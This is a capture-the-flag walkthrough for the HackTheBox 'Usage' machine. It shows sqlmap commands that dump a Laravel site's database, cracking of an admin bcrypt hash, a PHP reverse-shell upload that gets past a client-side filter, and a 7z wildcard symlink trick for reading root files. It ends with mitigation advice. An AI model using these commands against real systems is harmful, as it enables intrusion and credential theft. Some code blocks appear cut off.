## **Description:**

[Usage](https://www.hackthebox.com/machines/usage) from [HackTheBox](https://affiliate.hackthebox.com/nasrallahbaadi) is running a website vulnerable to an sql injection allowing us to dump the database and get a password hash, we crack it and login to an admin page running `Laravel-admin` which is vulnerable to a file upload giving us an initial foothold. A password is then found in a config file of a user that can run a binary as sudo. We reverse engineer the file and find it running 7z with a wildcard allowing us to read any file in the system.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.18
Host is up (0.43s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 running OpenSSh on Ubuntu, and port 80 running Nginx redirecting to `usage.htb` also running on Ubuntu.

Let's add `usage.htb` to `/etc/hosts` file before we continue.

### Web

Let's navigate to the website.

![home_page](1.png)

We are presented with a login page.

I tried some default credentials and basic sql injection but no luck.

![wappalyzer](3.png)

Checking `Wappalyzer` we see it's a `Laravel` application.

#### admin

We also find an admin page that goes to `admin.usage.htb`, we add it to `/etc/hosts` too and refresh the page.

![admin](4.png)

I guess this is the admin portal for the website.

I also tried some default credentials but didn't work.

#### Registration

There is a registration page, so let's register a user.

![register](2.png)

Let's login now.

![logged-in](5.png)

This looks like a blog, but there are no links and the posts talk about server-side language penetration testing.

#### Forget password

One other page we haven't visited yet is `http://usage.htb/forget-password`

![forgetpass](6.png)

I entered my email and I got this:

![emailsent](7.png)

I got sent an password reset link.

Since the box doesn't have internet access this won't give us anything.

I tried some sql injections, first with single quote `'` and got a server error.

![error](8.png)

This might indicate a sql injection vulnerability.

I added `-- -` which is a comment in mysql rendering the rest of the query useless and got this:

![sqli](9.png)

We confirmed a sql injection vulnerability, time to exploit it.

### SQL Map

We can use `sqlmap` with the following options

- `--form`: Use the `forget-password` form for testing
- `--batch`: To use default actions and not ask us every time.

```bash
$ sqlmap -u http://usage.htb/forget-password --form --batch                              
        ___

```

It found three databases, the one that interests us is `usage_blog`.

Let's dump the whole database.

```bash
sqlmap -u http://usage.htb/forget-password --form --batch --level 5 --risk 3 -D usage_blog --tables --dump
```

> This can take a lot of time so go take a walk or prepare a meal and come back.
{: .prompt-warning }
> For slightly faster results use `sqlmap -u http://usage.htb/forget-password --form --batch --level 5 --risk 3 -D usage_blog -T admin_users -C password,name --dump
`, This dumps the name and password columns from admin_users tables which is our target.
{: .prompt-info }

![hash](10.png)

On the `admin_users` table we find user `Administrator` with the hash `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`

Let's crack the hash using hashcat with the mode 3200.

```terminal
hashcat -m 3200 admin.hash rockyou.txt

We got the password!

### Admin panel

Let's navigate to `admin.usage.htb` and see if we can log in.

![adminlog](11.png)

We logged in successfully!

## **Foothold**

On the dashboard we see version of PHP and Laravel, None of them seem to be vulnerable.

On the settings page we can change the avatar by uploading an image.

![settings](12.png)

I smell a vulnerability here.

I uploaded a test image and found it get stored in `/uploads/images/`

Next I tried upload a php reverse shell, here is the one i used <https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>.

![upload failed](13.png)

There is filter here, but I haven't submitted the file so it seems it's a client-side filter.

I renamed the file to `shell.png` and tried again.

![shellpng](14.png)

It worked, now I submit it and intercept it with burp suite.

![burp](15.png)

We change the extension from png to php and forward the request.

Now if we navigate to `/uploads/images/shell.php` we should trigger the file to run and get a shell on the listener.

![shell](16.png)

## **Privilege Escalation**

### dash -> xander

If we check the home directory of `dash` we see `.ssh` directory that has an `id_rsa` file, so we can use it to get an ssh connection.

We also see some `monit` hidden files. Upon inspecting them we come across a password.

![pass](17.png)

I tried `sudo -l` with `dash` but the password didn't work.

Then I tried changing to user `xander` and it worked

```terminal
dash@usage:~$ su xander
Password: 
xander@usage:/home/dash$ id
uid=1001(xander) gid=1001(xander) groups=1001(xander)
xander@usage:/home/dash$ 
```

### xander -> root

Checking our privileges with `sudo -l`

```temrinal
xander@usage:/home/dash$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

We can run `usage_management` as root.

I ran `file` on it and it seems to be a binary executable.

```terminal
xander@usage:~$ file /usr/bin/usage_management 
/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
```

I ran the file with sudo and got this:

```terminal
xander@usage:~$ sudo /usr/bin/usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
```

We are presented with three option.

#### Ghidra

I transferred the file to my machine using `scp xander@usage.htb:/usr/bin/usage_management ./` and opened it on `ghidra`.

![ghidra](18.png)

There are three functions, one for each option.

The reset admin password seemed interesting but it's empty.

I checked the other functions and the `BackupWebContent`(option 1) looked interesting.

![backupwebcontent](19.png)

The function uses `7za` with a wildcard.

```bash
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

I searched for `7z wildcard exploit` and found this :<https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z>

![hacktricks](20.png)

Here the author suggests creating a file in the directory where the command is being executed, and make symbolic link with the file we want to read.

```terminal
xander@usage:/var/www/html$ touch @root.txt
xander@usage:/var/www/html$ ln -s /root/root.txt @root.txt
ln: failed to create symbolic link '@root.txt': File exists
xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

We got the flag, but let's get a root shell.

We saw earlier that `dash` has a private key, let's hope it's the same for root.

```bash

## **Prevention and Mitigation**

### SQL injection

The form should should add a solid input validation (a whitelisting permitted input values) and also use parameterized queries to separate user input from the query structure.

### File upload

Allowing users to upload files is commonplace and doesn't have to be dangerous as long as you take the right precautions.

In our case, laravel-admin v1.8.19 is the one vulnerable to the file upload [CVE-2023-24249](https://flyd.uk/post/cve-2023-24249/) allowing attackers to execute arbitrary code via a crafted PHP file.

In general, the most effective way to protect your own websites from these vulnerabilities is to implement all of the following practices:

- Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.
- Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence `(../)`.
- Rename uploaded files to avoid collisions that may cause existing files to be overwritten.
- Do not upload files to the server's permanent filesystem until they have been fully validated.
- As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms.

### 7z

The wild card in `7z` can be exploited to read files in the system, so avoid using it if possible, and always apply the principle of least privilege.
